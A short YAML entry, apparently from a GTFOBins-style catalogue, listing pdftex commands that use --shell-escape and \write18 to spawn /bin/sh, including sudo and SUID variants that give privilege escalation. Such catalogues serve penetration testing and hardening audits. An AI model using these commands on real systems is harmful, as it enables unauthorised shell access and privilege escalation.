---
functions:
  shell:
    - code: |
        pdftex --shell-escape '\write18{/bin/sh}\end'
  sudo:
    - code: |
        sudo pdftex --shell-escape '\write18{/bin/sh}\end'
  limited-suid:
    - code: |
        ./pdftex --shell-escape '\write18{/bin/sh}\end'
---
